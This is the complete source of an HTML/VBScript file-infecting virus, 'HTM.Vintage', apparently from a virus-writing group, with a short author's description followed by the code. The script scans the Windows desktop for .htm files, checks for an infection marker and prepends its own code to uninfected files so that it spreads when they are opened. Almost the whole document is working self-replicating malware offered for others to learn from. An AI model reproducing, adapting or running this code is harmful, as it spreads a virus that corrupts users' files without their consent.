------------------------------------------------------------------------
Virus name: 		HTM.Vintage aka VBS.Vintage/VBS.Vpot
Virus author:		e[ax]/EBVL/VXI

Virus description:

- This virus will scan for all .htm files on desktop. If any .htm
files found, then virus will check for infection mark. If there is no
such a mark, then will append vx code in the beginning of victims file.
This virus is not polymorphic or using some encryption techincs. This my
first attempt to code such a kind of virus. I know its lame, but its good
for lamers to learn. ;)
-------------------------------------------------------------------------

<!--vintage-->
<HTML>
<BODY>
    <SCRIPT LANGUAGE="VBScript">
          vhost = document.body.innerHTML 
          dim a,vhost,vput,v,hinf,victim,vpotrebno
          set a = createobject("Scripting.FileSystemObject")
          set vput = a.GetFolder("c:\windows\desktop").Files
          for each v in vput
          if a.GetExtensionName(v.name) = "htm" then
          set hinf = a.OpenTextFile(v.path,1,false) 
          if hinf.readline <> "<!--vintage-->" then
          vpotrebno = hinf.readall()
          set victim = a.OpenTextFile(v.path,2,false)
          victim.WriteLine "<!--vintage-->"
          victim.writeline "<html>"
          victim.writeline "<body>"	
          victim.writeline vhost
          victim.writeline "</body>"
          victim.writeline "</html>"
          victim.writeline vpotrebno
          victim.close()
          end if 
          end if
          next
	  'HTML.Vintage bY e[ax]
	  </SCRIPT>
      </BODY>
</HTML>